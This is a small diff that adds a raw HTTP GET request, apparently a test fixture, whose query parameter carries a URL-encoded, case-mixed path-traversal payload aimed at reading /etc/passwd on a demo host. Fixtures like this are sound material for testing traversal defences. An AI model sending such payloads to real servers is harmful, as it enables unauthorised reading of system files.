@@ -1,0 +1,4 @@
+GET /a?data=%2e%2E/%2e%2E//eTc/PaSsWd HTTP/1.1
+Host: demo.example.com
+Connection: close
+
